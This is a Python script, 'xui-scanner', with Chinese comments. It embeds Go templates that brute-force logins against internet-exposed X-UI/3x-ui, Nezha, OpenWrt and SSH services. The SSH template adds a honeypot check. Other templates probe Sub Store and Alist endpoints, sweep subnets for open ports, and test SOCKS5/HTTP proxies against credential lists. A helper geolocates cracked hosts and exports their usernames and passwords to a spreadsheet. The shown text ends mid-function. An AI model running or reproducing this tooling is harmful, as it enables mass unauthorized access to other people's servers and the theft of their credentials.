# -*- coding: utf-8 -*-

# ======================================================================================
#                            xui-scanner (Ultimate Full Version)
# ======================================================================================
#
# 这是一份包含所有高级功能的最终优化版脚本。
#
# 1. 性能分析 (Profiling) - 默认启用:
#   - Python部分: 使用 cProfile:
#     python -m cProfile -o profile.stats <script_name>.py
#     然后使用 snakeviz profile.stats 可视化结果。
#
#   - Go部分: pprof HTTP服务已在所有Go模板中默认启用。
#     扫描运行时，第一个启动的Go子进程将在 http://localhost:6060/debug/pprof/ 提供服务。
#     您可以在扫描期间通过浏览器访问该地址，或使用命令行工具进行分析:
#     go tool pprof http://localhost:6060/debug/pprof/profile?seconds=30
#
# 2. 系统调优 (Linux):
#   - 脚本会自动尝试提升文件描述符限制并管理Swap。
#   - 为获得最佳网络性能，建议以root身份运行本脚本开头的 "recommend_kernel_tuning" 函数
#     所打印的sysctl命令。
#
# ======================================================================================

import os
import subprocess
import time
import shutil
import sys
import atexit
import re
import json
import base64
import binascii
import importlib.util # 修复导入错误所需
import uuid # 为并发扩展扫描生成唯一ID
from multiprocessing import Process, Lock, Manager
from concurrent.futures import ProcessPoolExecutor, as_completed

# ==================== 依赖导入强化 ====================
try:
    import psutil
    import requests
    import yaml
    from openpyxl import Workbook, load_workbook
    from xlsxwriter import Workbook as XlsxWriterWorkbook
    from tqdm import tqdm
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError as e:
    print(f"{Fore.RED}❌ 错误：核心 Python 模块缺失！")
    print(f"缺失的模块是: {e.name}")
    print(f"{Fore.YELLOW}python3 -m pip install psutil requests pyyaml openpyxl tqdm colorama xlsxwriter --break-system-packages")
    sys.exit(1)

try:
    import readline
except ImportError:
    pass

try:
    import resource
except ImportError:
    resource = None
# =================================================

# ==================== 全局变量 ====================
TIMEOUT = 5
VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志

# =========================== Go 模板 (pprof 已启用) ===========================

# XUI/3x-ui 面板登录模板
XUI_GO_TEMPLATE_1_LINES = [
    "package main", "", "import (", "	\"bufio\"", "	\"encoding/json\"", "	\"fmt\"", "	\"os\"", "	\"strings\"", "	\"sync\"", "	\"time\"", "   \"log\"", "	\"net/http\"", "	_ \"net/http/pprof\"", "", "	\"github.com/valyala/fasthttp\"", ")", "",
    "func processIP(line string, resultsChan chan<- string, usernames []string, passwords []string, client *fasthttp.Client) {",
    "	parts := strings.Split(strings.TrimSpace(line), \":\"); if len(parts) != 2 { return }", "	ipPort := parts[0] + \":\" + parts[1]",
    "	req := fasthttp.AcquireRequest(); resp := fasthttp.AcquireResponse(); defer fasthttp.ReleaseRequest(req); defer fasthttp.ReleaseResponse(resp)",
    "	var urlBuilder, payloadBuilder strings.Builder",
    "	for _, username := range usernames {", "		for _, password := range passwords {",
    "			payloadBuilder.Reset(); payloadBuilder.WriteString(\"username=\"); payloadBuilder.WriteString(username); payloadBuilder.WriteString(\"&password=\"); payloadBuilder.WriteString(password)",
    "			req.SetBodyString(payloadBuilder.String()); req.Header.SetContentType(\"application/x-www-form-urlencoded\"); req.Header.SetMethod(\"POST\")",
    "			for _, scheme := range []string{\"http\", \"https\"} {",
    "				urlBuilder.Reset(); urlBuilder.WriteString(scheme); urlBuilder.WriteString(\"://\"); urlBuilder.WriteString(ipPort); urlBuilder.WriteString(\"/login\"); req.SetRequestURI(urlBuilder.String())",
    "				if err := client.Do(req, resp); err == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "					var data map[string]interface{}", "					if json.Unmarshal(resp.Body(), &data) == nil {",
    "						if success, ok := data[\"success\"].(bool); ok && success { resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, username, password); return }", "					}", "				}", "			}", "		}", "	}", "}", "",
    "func worker(tasks <-chan string, resultsChan chan<- string, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{ TLSConfig: &fasthttp.TLSConfig{InsecureSkipVerify: true}, ReadTimeout:  {timeout} * time.Second, WriteTimeout: {timeout} * time.Second, MaxConnsPerHost: 5, MaxIdleConnDuration: 1 * time.Minute }",
    "	for line := range tasks { processIP(line, resultsChan, usernames, passwords, client) }", "}", "",
    "func main() {", "	go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }()",
    "	writer := bufio.NewWriter(os.Stdout); defer writer.Flush()",
    "	resultsChan := make(chan string, {semaphore_size}); var resultsWg sync.WaitGroup",
    "	resultsWg.Add(1); go func() { defer resultsWg.Done(); for result := range resultsChan { fmt.Fprintln(writer, result) } }()",
    "	usernames, passwords := {user_list}, {pass_list}; if len(usernames) == 0 || len(passwords) == 0 { return }",
    "	tasks := make(chan string, {semaphore_size}); var workerWg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { workerWg.Add(1); go worker(tasks, resultsChan, &workerWg, usernames, passwords) }",
    "	scanner := bufio.NewScanner(os.Stdin); for scanner.Scan() { line := strings.TrimSpace(scanner.Text()); if line != \"\" { tasks <- line } }",
    "	close(tasks); workerWg.Wait(); close(resultsChan); resultsWg.Wait()", "}",
]

# 哪吒面板登录模板
XUI_GO_TEMPLATE_2_LINES = [
    "package main", "", "import (", "	\"bufio\"; \"encoding/json\"; \"fmt\"; \"os\"; \"strings\"; \"sync\"; \"time\"; \"log\"; \"net/http\"; _ \"net/http/pprof\"", "", "	\"github.com/valyala/fasthttp\"", ")", "",
    "type LoginPayload struct { Username string `json:\"username\"`; Password string `json:\"password\"` }", "",
    "func processIP(line string, resultsChan chan<- string, usernames []string, passwords []string, client *fasthttp.Client) {",
    "	parts := strings.Split(strings.TrimSpace(line), \":\"); if len(parts) != 2 { return }", "	ipPort := parts[0] + \":\" + parts[1]",
    "	req := fasthttp.AcquireRequest(); resp := fasthttp.AcquireResponse(); defer fasthttp.ReleaseRequest(req); defer fasthttp.ReleaseResponse(resp)",
    "	var urlBuilder strings.Builder", "	for _, username := range usernames {", "		for _, password := range passwords {",
    "			jsonPayload, _ := json.Marshal(LoginPayload{Username: username, Password: password})",
    "			req.SetBody(jsonPayload); req.Header.SetContentType(\"application/json\"); req.Header.SetMethod(\"POST\")",
    "			for _, scheme := range []string{\"http\", \"https\"} {",
    "				urlBuilder.Reset(); urlBuilder.WriteString(scheme); urlBuilder.WriteString(\"://\"); urlBuilder.WriteString(ipPort); urlBuilder.WriteString(\"/api/v1/login\")", "				req.SetRequestURI(urlBuilder.String())",
    "				if err := client.Do(req, resp); err == nil && resp.StatusCode() == fasthttp.StatusOK {", "					var data map[string]interface{}",
    "					if json.Unmarshal(resp.Body(), &data) == nil {", "						if dataVal, ok := data[\"data\"].(map[string]interface{}); ok {",
    "							if _, tokenExists := dataVal[\"token\"]; tokenExists { resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, username, password); return }", "						}", "					}", "				}", "			}", "		}", "	}", "}", "",
    "func worker(tasks <-chan string, resultsChan chan<- string, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()", "	client := &fasthttp.Client{ TLSConfig: &fasthttp.TLSConfig{InsecureSkipVerify: true}, ReadTimeout:  {timeout} * time.Second, WriteTimeout: {timeout} * time.Second, MaxConnsPerHost: 5, MaxIdleConnDuration: 1 * time.Minute, }",
    "	for line := range tasks { processIP(line, resultsChan, usernames, passwords, client) }", "}", "",
    "func main() {", "	go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }()",
    "	writer := bufio.NewWriter(os.Stdout); defer writer.Flush()",
    "	resultsChan := make(chan string, {semaphore_size}); var resultsWg sync.WaitGroup",
    "	resultsWg.Add(1); go func() { defer resultsWg.Done(); for result := range resultsChan { fmt.Fprintln(writer, result) } }()",
    "	usernames, passwords := {user_list}, {pass_list}; if len(usernames) == 0 || len(passwords) == 0 { return }",
    "	tasks := make(chan string, {semaphore_size}); var workerWg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { workerWg.Add(1); go worker(tasks, resultsChan, &workerWg, usernames, passwords) }",
    "	scanner := bufio.NewScanner(os.Stdin); for scanner.Scan() { line := strings.TrimSpace(scanner.Text()); if line != \"\" { tasks <- line } }",
    "	close(tasks); workerWg.Wait(); close(resultsChan); resultsWg.Wait()", "}",
]

# SSH 登录模板
XUI_GO_TEMPLATE_6_LINES = [
    "package main", "", "import (", "	\"bufio\"; \"fmt\"; \"os\"; \"strings\"; \"sync\"; \"time\"", "	\"golang.org/x/crypto/ssh\"; \"log\"; \"net/http\"; _ \"net/http/pprof\"", ")", "",
    "func trySSH(ip, port, username, password string) (*ssh.Client, bool) {",
    "	config := &ssh.ClientConfig{ User: username, Auth: []ssh.AuthMethod{ssh.Password(password)}, HostKeyCallback: ssh.InsecureIgnoreHostKey(), Timeout: {timeout} * time.Second }",
    "	client, err := ssh.Dial(\"tcp\", ip+\":\"+port, config); return client, err == nil", "}", "",
    "func isLikelyHoneypot(client *ssh.Client) bool {",
    "	session, err := client.NewSession(); if err != nil { return true }; defer session.Close()",
    "	if session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{}) != nil { return true }",
    "	output, err := session.CombinedOutput(\"echo $((1+1))\"); if err != nil { return true }",
    "	return strings.TrimSpace(string(output)) != \"2\"", "}", "",
    "func processIP(line string, resultsChan chan<- string, usernames, passwords []string) {",
    "	parts := strings.Split(strings.TrimSpace(line), \":\"); if len(parts) != 2 { return }",
    "	ip, port := parts[0], parts[1]", "	for _, username := range usernames {", "		for _, password := range passwords {",
    "			if client, success := trySSH(ip, port, username, password); success {",
    "				if !isLikelyHoneypot(client) { resultsChan <- fmt.Sprintf(\"%s:%s %s %s\", ip, port, username, password) }",
    "				client.Close(); return", "			}", "		}", "	}", "}", "",
    "func worker(tasks <-chan string, resultsChan chan<- string, wg *sync.WaitGroup, usernames, passwords []string) {",
    "	defer wg.Done(); for line := range tasks { processIP(line, resultsChan, usernames, passwords) }", "}", "",
    "func main() {", "	go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }()",
    "	writer := bufio.NewWriter(os.Stdout); defer writer.Flush()",
    "	resultsChan := make(chan string, {semaphore_size}); var resultsWg sync.WaitGroup",
    "	resultsWg.Add(1); go func() { defer resultsWg.Done(); for r := range resultsChan { fmt.Fprintln(writer, r) } }()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size}); var workerWg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { workerWg.Add(1); go worker(tasks, resultsChan, &workerWg, usernames, passwords) }",
    "	scanner := bufio.NewScanner(os.Stdin); for scanner.Scan() { tasks <- strings.TrimSpace(scanner.Text()) }",
    "	close(tasks); workerWg.Wait(); close(resultsChan); resultsWg.Wait()", "}",
]

# Sub Store 路径扫描模板
XUI_GO_TEMPLATE_7_LINES = [
    "package main", "", "import (", "	\"bufio\"; \"fmt\"; \"os\"; \"strings\"; \"sync\"; \"time\"", "	\"github.com/valyala/fasthttp\"; \"log\"; \"net/http\"; _ \"net/http/pprof\"", ")", "",
    "func sendRequest(client *fasthttp.Client, fullURL string) bool {", "	code, body, err := client.Get(nil, fullURL)",
    "	return err == nil && code == fasthttp.StatusOK && strings.Contains(string(body), `{\"status\":\"success\",\"data\"`)", "}", "",
    "func processIP(line string, resultsChan chan<- string, paths []string, client *fasthttp.Client) {",
    "	ipPort := strings.TrimSpace(line); var urlBuilder, resultBuilder strings.Builder",
    "	for _, path := range paths {", "		cleanPath := strings.Trim(path, \"/\"); fullPath := cleanPath + \"/api/utils/env\"",
    "		for _, scheme := range []string{\"http\", \"https\"} {",
    "			urlBuilder.Reset(); urlBuilder.WriteString(scheme); urlBuilder.WriteString(\"://\"); urlBuilder.WriteString(ipPort); urlBuilder.WriteString(\"/\"); urlBuilder.WriteString(fullPath)",
    "			if sendRequest(client, urlBuilder.String()) {",
    "				resultBuilder.Reset(); resultBuilder.WriteString(scheme); resultBuilder.WriteString(\"://\"); resultBuilder.WriteString(ipPort); resultBuilder.WriteString(\"?api=\"); resultBuilder.WriteString(scheme); resultBuilder.WriteString(\"://\"); resultBuilder.WriteString(ipPort); resultBuilder.WriteString(\"/\"); resultBuilder.WriteString(cleanPath)",
    "				resultsChan <- resultBuilder.String(); return", "			}", "		}", "	}", "}", "",
    "func worker(tasks <-chan string, resultsChan chan<- string, wg *sync.WaitGroup, paths []string) {",
    "	defer wg.Done(); client := &fasthttp.Client{ TLSConfig: &fasthttp.TLSConfig{InsecureSkipVerify: true}, ReadTimeout: {timeout}*time.Second }",
    "	for line := range tasks { processIP(line, resultsChan, paths, client) }", "}", "",
    "func main() {", "	go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }()",
    "	writer := bufio.NewWriter(os.Stdout); defer writer.Flush()",
    "	resultsChan := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	wg.Add(1); go func() { defer wg.Done(); for r := range resultsChan { fmt.Fprintln(writer, r) } }()",
    "	paths := {pass_list}", "	tasks := make(chan string, {semaphore_size}); var workerWg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { workerWg.Add(1); go worker(tasks, resultsChan, &workerWg, paths) }",
    "	scanner := bufio.NewScanner(os.Stdin); for scanner.Scan() { tasks <- strings.TrimSpace(scanner.Text()) }",
    "	close(tasks); workerWg.Wait(); close(resultsChan); wg.Wait()", "}",
]

# OpenWrt/iStoreOS 登录模板
XUI_GO_TEMPLATE_8_LINES = [
    "package main", "", "import (", "	\"bufio\"; \"fmt\"; \"net/url\"; \"os\"; \"strings\"; \"sync\"; \"time\"", "	\"github.com/valyala/fasthttp\"; \"log\"; \"net/http\"; _ \"net/http/pprof\"", ")", "",
    "func checkLogin(targetURL, username, password, referer string, client *fasthttp.Client) bool {",
    "	req := fasthttp.AcquireRequest(); resp := fasthttp.AcquireResponse(); defer fasthttp.ReleaseRequest(req); defer fasthttp.ReleaseResponse(resp)",
    "	payload := fmt.Sprintf(\"luci_username=%s&luci_password=%s\", username, password)",
    "	req.SetRequestURI(targetURL); req.Header.SetMethod(\"POST\"); req.Header.SetContentType(\"application/x-www-form-urlencoded\"); req.Header.SetReferer(referer); req.SetBodyString(payload)",
    "	if client.Do(req, resp) != nil { return false }", "	var hasCookie bool; resp.Header.VisitAllCookie(func(k, v []byte) { if string(k) == \"sysauth_http\" { hasCookie = true } })",
    "	return hasCookie", "}", "", "func processIP(line string, resultsChan chan<- string, usernames, passwords []string, client *fasthttp.Client) {",
    "	trimmed := strings.TrimSpace(line); var targets []string",
    "	if strings.HasPrefix(trimmed, \"http\") { targets = append(targets, trimmed) } else { targets = append(targets, \"http://\"+trimmed, \"https://\"+trimmed) }",
    "	for _, target := range targets {", "		if u, err := url.Parse(target); err == nil {",
    "			referer := u.Scheme + \"://\" + u.Host + \"/\"",
    "			for _, user := range usernames { for _, pass := range passwords { if checkLogin(target, user, pass, referer, client) { resultsChan <- fmt.Sprintf(\"%s %s %s\", target, user, pass); return } } }", "		}", "	}", "}", "",
    "func worker(tasks <-chan string, resultsChan chan<- string, wg *sync.WaitGroup, usernames, passwords []string) {", "	defer wg.Done()",
    "	client := &fasthttp.Client{ TLSConfig: &fasthttp.TLSConfig{InsecureSkipVerify: true}, ReadTimeout: {timeout} * time.Second, WriteTimeout: {timeout} * time.Second, FollowRedirects: false, MaxConnsPerHost: 5, MaxIdleConnDuration: 1 * time.Minute, }",
    "	for line := range tasks { processIP(line, resultsChan, usernames, passwords, client) }", "}", "",
    "func main() {", "	go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }()",
    "	writer := bufio.NewWriter(os.Stdout); defer writer.Flush()",
    "	resultsChan := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	wg.Add(1); go func() { defer wg.Done(); for r := range resultsChan { fmt.Fprintln(writer, r) } }()",
    "	usernames, passwords := {user_list}, {pass_list}", "	tasks := make(chan string, {semaphore_size}); var workerWg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { workerWg.Add(1); go worker(tasks, resultsChan, &workerWg, usernames, passwords) }",
    "	scanner := bufio.NewScanner(os.Stdin); for scanner.Scan() { tasks <- strings.TrimSpace(scanner.Text()) }",
    "	close(tasks); workerWg.Wait(); close(resultsChan); wg.Wait()", "}",
]

# Alist 面板扫描模板
ALIST_GO_TEMPLATE_LINES = [
    "package main", "", "import (", "	\"bufio\"; \"encoding/json\"; \"fmt\"; \"os\"; \"strings\"; \"sync\"; \"time\"", "	\"github.com/valyala/fasthttp\"; \"log\"; \"net/http\"; _ \"net/http/pprof\"", ")", "",
    "func processIP(ipPort string, resultsChan chan<- string, client *fasthttp.Client) {",
    "	for _, proto := range []string{\"http\", \"https\"} {", "		baseURL := proto + \"://\" + ipPort",
    "		code, body, err := client.Get(nil, baseURL+\"/api/me\")", "		if err == nil && code == fasthttp.StatusOK {",
    "			var data map[string]interface{};",
    "			if json.Unmarshal(body, &data) == nil {", "				if c, ok := data[\"code\"]; ok && fmt.Sprintf(\"%v\", c) == \"200\" { resultsChan <- baseURL; return }", "			}", "		}", "	}", "}", "",
    "func worker(tasks <-chan string, resultsChan chan<- string, wg *sync.WaitGroup) {",
    "	defer wg.Done(); client := &fasthttp.Client{ TLSConfig: &fasthttp.TLSConfig{InsecureSkipVerify: true}, ReadTimeout: {timeout} * time.Second }",
    "	for line := range tasks { processIP(line, resultsChan, client) }", "}", "",
    "func main() {", "	go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }()",
    "	writer := bufio.NewWriter(os.Stdout); defer writer.Flush()",
    "	resultsChan := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	wg.Add(1); go func() { defer wg.Done(); for r := range resultsChan { fmt.Fprintln(writer, r) } }()",
    "	tasks := make(chan string, {semaphore_size}); var workerWg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { workerWg.Add(1); go worker(tasks, resultsChan, &workerWg) }",
    "	scanner := bufio.NewScanner(os.Stdin); for scanner.Scan() { tasks <- strings.TrimSpace(strings.Fields(scanner.Text())[0]) }",
    "	close(tasks); workerWg.Wait(); close(resultsChan); wg.Wait()", "}",
]

# TCP 端口活性测试模板
TCP_ACTIVE_GO_TEMPLATE_LINES = [
    "package main", "", "import (", "	\"bufio\"; \"fmt\"; \"net\"; \"os\"; \"strings\"; \"sync\"; \"time\"", "	\"log\"; \"net/http\"; _ \"net/http/pprof\"", ")", "",
    "func worker(tasks <-chan string, resultsChan chan<- string, wg *sync.WaitGroup) {",
    "	defer wg.Done(); for ipPort := range tasks { if conn, err := net.DialTimeout(\"tcp\", ipPort, {timeout}*time.Second); err == nil { conn.Close(); resultsChan <- ipPort } }", "}", "",
    "func main() {", "	go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }()",
    "	writer := bufio.NewWriter(os.Stdout); defer writer.Flush()",
    "	resultsChan := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	wg.Add(1); go func() { defer wg.Done(); for r := range resultsChan { fmt.Fprintln(writer, r) } }()",
    "	tasks := make(chan string, {semaphore_size}); var workerWg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { workerWg.Add(1); go worker(tasks, resultsChan, &workerWg) }",
    "	scanner := bufio.NewScanner(os.Stdin); for scanner.Scan() { tasks <- strings.TrimSpace(scanner.Text()) }",
    "	close(tasks); workerWg.Wait(); close(resultsChan); wg.Wait()", "}",
]

# SOCKS5 代理验证模板 (模式9) - Refactored from user's code
SOCKS5_PROXY_GO_TEMPLATE_LINES = [
    "package main", "", "import (", "	\"bufio\"; \"fmt\"; \"net\"; \"net/url\"; \"os\"; \"strings\"; \"sync\"; \"time\"", "	\"log\"; \"net/http\"; _ \"net/http/pprof\"", ")", "",
    "type Creds struct { Username, Password string }",
    "func checkProxyAuth(target string, creds Creds, timeout time.Duration) bool {",
    "	conn, err := net.DialTimeout(\"tcp\", target, timeout); if err != nil { return false }; defer conn.Close()",
    "	conn.Write([]byte{0x05, 0x02, 0x00, 0x02})",
    "	reply := make([]byte, 2); conn.SetReadDeadline(time.Now().Add(timeout)); _, err = conn.Read(reply)",
    "	if err != nil || reply[0] != 0x05 { return false }",
    "	switch reply[1] {",
    "	case 0x00: return creds.Username == \"\" && creds.Password == \"\"",
    "	case 0x02:",
    "		if creds.Username == \"\" && creds.Password == \"\" { return false }",
    "		b := []byte{0x01, byte(len(creds.Username))}; b = append(b, []byte(creds.Username)...)",
    "		b = append(b, byte(len(creds.Password))); b = append(b, []byte(creds.Password)...)",
    "		conn.Write(b); authReply := make([]byte, 2); conn.SetReadDeadline(time.Now().Add(timeout)); _, err = conn.Read(authReply)",
    "		return err == nil && authReply[0] == 0x01 && authReply[1] == 0x00",
    "	}",
    "	return false",
    "}",
    "func worker(tasks <-chan string, results chan<- string, wg *sync.WaitGroup, credentials []Creds) {",
    "	defer wg.Done()",
    "	for target := range tasks {",
    "		for _, cred := range credentials {",
    "			if checkProxyAuth(target, cred, time.Duration({timeout})*time.Second) {",
    "				if cred.Username != \"\" { results <- fmt.Sprintf(\"socks5://%s:%s@%s\", url.QueryEscape(cred.Username), url.QueryEscape(cred.Password), target) } else { results <- fmt.Sprintf(\"socks5://%s\", target) }",
    "				break",
    "			}",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }()",
    "	writer := bufio.NewWriter(os.Stdout); defer writer.Flush()",
    "	resultsChan := make(chan string, {semaphore_size}); var wg sync.WaitGroup; wg.Add(1)",
    "	go func() { defer wg.Done(); for r := range resultsChan { fmt.Fprintln(writer, r) } }()",
    "	var credentials []Creds",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	if len(usernames) > 0 || len(passwords) > 0 { for _, u := range usernames { for _, p := range passwords { credentials = append(credentials, Creds{u, p}) } } } else { credentials = append(credentials, Creds{\"\", \"\"}) }",
    "	tasks := make(chan string, {semaphore_size}); var workerWg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { workerWg.Add(1); go worker(tasks, resultsChan, &workerWg, credentials) }",
    "	scanner := bufio.NewScanner(os.Stdin); for scanner.Scan() { tasks <- strings.TrimSpace(scanner.Text()) }",
    "	close(tasks); workerWg.Wait(); close(resultsChan); wg.Wait()",
    "}",
]
# HTTP/HTTPS 代理验证模板 (模式10, 11) - Refactored from user's code
HTTP_PROXY_GO_TEMPLATE_LINES = [
    "package main", "", "import (", "	\"bufio\"; \"encoding/json\"; \"fmt\"; \"io/ioutil\"; \"log\"; \"net\"; \"net/http\"; _ \"net/http/pprof\"; \"net/url\"; \"os\"; \"strings\"; \"sync\"; \"time\"", ")", "",
    "type Task struct { ProxyAddress, Username, Password string }", "type HttpbinResponse struct { Origin string `json:\"origin\"` }",
    "func main() {",
    "	go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }()",
    "	log.SetOutput(os.Stderr); log.SetFlags(log.Ltime)",
    "	targetURL := \"{test_url}\"; timeout := time.Duration({timeout}) * time.Second; workers := {semaphore_size}",
    "	var proxies []string; scanner := bufio.NewScanner(os.Stdin); for scanner.Scan() { proxies = append(proxies, strings.TrimSpace(scanner.Text())) }",
    "	usernames, passwords := {user_list}, {pass_list}; var tasks []Task",
    "	if len(usernames) > 0 || len(passwords) > 0 { for _, p := range proxies { for _, u := range usernames { for _, pwd := range passwords { tasks = append(tasks, Task{ProxyAddress: p, Username: u, Password: pwd}) } } } } else { for _, p := range proxies { tasks = append(tasks, Task{ProxyAddress: p}) } }",
    "	taskChan := make(chan Task, workers); resultChan := make(chan string, len(tasks)); var wg sync.WaitGroup",
    "	for i := 0; i < workers; i++ { wg.Add(1); go worker(&wg, taskChan, resultChan, targetURL, timeout) }",
    "	go func() { for _, task := range tasks { taskChan <- task }; close(taskChan) }()",
    "	go func() { wg.Wait(); close(resultChan) }()",
    "	writer := bufio.NewWriter(os.Stdout); defer writer.Flush(); for result := range resultChan { fmt.Fprintln(writer, result) }",
    "}",
    "func worker(wg *sync.WaitGroup, tasks <-chan Task, results chan<- string, targetURL string, timeout time.Duration) {",
    "	defer wg.Done(); for task := range tasks { if checkProxy(task.ProxyAddress, formatProxyURL(task), targetURL, timeout) { results <- formatProxyURL(task) } }",
    "}",
    "func checkProxy(proxyAddr, proxyURLStr, targetURL string, timeout time.Duration) bool {",
    "	isProxy, _ := testAsProxy(proxyAddr, proxyURLStr, targetURL, timeout); return isProxy && !testAsWebServer(proxyAddr, timeout)",
    "}",
    "func testAsProxy(proxyAddr, proxyURLStr, targetURL string, timeout time.Duration) (bool, string) {",
    "	proxyURL, err := url.Parse(proxyURLStr); if err != nil { return false, \"\" }",
    "	proxyHost, _, err := net.SplitHostPort(proxyAddr); if err != nil { return false, \"\" }",
    "	client := &http.Client{ Transport: &http.Transport{ Proxy: http.ProxyURL(proxyURL), DialContext: (&net.Dialer{ Timeout: timeout }).DialContext, TLSHandshakeTimeout: timeout }, Timeout: timeout + (5 * time.Second) }",
    "	req, err := http.NewRequest(\"GET\", targetURL, nil); if err != nil { return false, \"\" }; req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "	resp, err := client.Do(req); if err != nil { return false, \"\" }; defer resp.Body.Close()",
    "	if resp.StatusCode != http.StatusOK { return false, \"\" }",
    "	body, err := ioutil.ReadAll(resp.Body); if err != nil { return false, \"\" }",
    "	var result HttpbinResponse; if json.Unmarshal(body, &result) != nil { return false, \"\" }",
    "	return strings.Contains(result.Origin, proxyHost), proxyHost",
    "}",
    "func testAsWebServer(proxyAddr string, timeout time.Duration) bool {",
    "	client := &http.Client{ Timeout: timeout, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse } }",
    "	resp, err := client.Get(\"http://\" + proxyAddr + \"/\"); if err != nil { return false }; defer resp.Body.Close()",
    "	return resp.StatusCode >= 200 && resp.StatusCode < 400",
    "}",
    "func formatProxyURL(task Task) string {",
    "	proxyScheme := \"{proxy_type}\"",
    "	if task.Username != \"\" || task.Password != \"\" { return fmt.Sprintf(\"%s://%s:%s@%s\", proxyScheme, url.QueryEscape(task.Username), url.QueryEscape(task.Password), task.ProxyAddress) }",
    "	return fmt.Sprintf(\"%s://%s\", proxyScheme, task.ProxyAddress)",
    "}",
]

# 子网TCP扫描模板
SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES = [
    "package main", "", "import (", "	\"bufio\"; \"fmt\"; \"net\"; \"os\"; \"sync\"; \"time\"", ")", "",
    "func inc(ip net.IP) { for j := len(ip) - 1; j >= 0; j-- { ip[j]++; if ip[j] > 0 { break } } }",
    "func main() {", "	if len(os.Args) < 4 { os.Exit(1) }",
    "	cidr, port, concurrencyStr := os.Args[1], os.Args[2], os.Args[3]; concurrency := 0",
    "	fmt.Sscanf(concurrencyStr, \"%d\", &concurrency); writer := bufio.NewWriter(os.Stdout); defer writer.Flush()",
    "	ip, ipnet, err := net.ParseCIDR(cidr); if err != nil { os.Exit(1) }",
    "	var wg sync.WaitGroup; sem := make(chan struct{}, concurrency)",
    "	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {", "		sem <- struct{}{}; wg.Add(1)",
    "		go func(ipCopy net.IP) {", "			defer wg.Done(); defer func() { <-sem }()",
    "			if conn, err := net.DialTimeout(\"tcp\", ipCopy.String()+\":\"+port, 3*time.Second); err == nil { conn.Close(); fmt.Fprintln(writer, ipCopy.String()+\":\"+port) }",
    "		}(append(net.IP(nil), ip...))", "	}", "	wg.Wait()", "}",
]

# =========================== ipcx.py ===========================
IPCX_PY_CONTENT = r"""import requests;import time;import os;import re;import sys;import json;from xlsxwriter import Workbook;from tqdm import tqdm
def e(u):
    m=re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)',u);return m.group(3) if m else (re.search(r'([^:/\s]+:\d+)',u).group(1) if re.search(r'([^:/\s]+:\d+)',u) else (re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)',u).group(3) if re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)',u) else (u.split()[0] if u.split() else '')))
def g(l,r=3):
    u="http://ip-api.com/batch?fields=country,regionName,city,isp,query,status";d={};p=[{"query":i.split(':')[0]} for i in l]
    for _ in range(r):
        try:
            x=requests.post(u,json=p,timeout=20);x.raise_for_status();data=x.json()
            for i in data:
                o=next((ip for ip in l if ip.startswith(i.get('query',''))),None)
                if o:d[o]=[o,i.get('country','N/A'),i.get('regionName','N/A'),i.get('city','N/A'),i.get('isp','N/A')] if i.get('status')=='success' else [o,'查询失败']*4
            return [d.get(i,[i,'N/A','N/A','N/A','N/A']) for i in l]
        except:time.sleep(2)
    return [[i,'超时/错误']*4 for i in l]
def p(f_in,f_out):
    rows=[['原始地址','IP/域名:端口','用户名','密码','国家','地区','城市','ISP']];targets=[]
    with open(f_in,'r',encoding='utf-8',errors='ignore') as f:
        for line in f:
            ln=line.strip();
            if not ln:continue
            a,u,p=ln,'',''
            m=re.match(r'(\w+://)(?:([^:]+):([^@]+)@)?(.+)',ln)
            if m:u,p,a=m.group(2) or '',m.group(3) or '',m.group(1)+m.group(4)
            else:
                parts=ln.split();a=parts[0];u=parts[1] if len(parts)>1 else'';p=parts[2] if len(parts)>2 else''
            ip_port=e(a)
            if ip_port:targets.append({'line':ln,'ip_port':ip_port,'user':u,'passwd':p})
    with tqdm(total=len(targets),desc="[📊] IP信息查询",unit="ip",ncols=100) as pbar:
        for i in range(0,len(targets),100):
            c=targets[i:i+100];ipc=[t['ip_port'] for t in c];br=g(ipc)
            for t,res in zip(c,br):rows.append([t['line'],res[0],t['user'],t['passwd']]+res[1:])
            pbar.update(len(c))
            if i+100<len(targets):time.sleep(4.5)
    wb=Workbook(f_out);ws=wb.add_worksheet("IP信息")
    for r_num,r_data in enumerate(rows):ws.write_row(r_num,0,r_data)
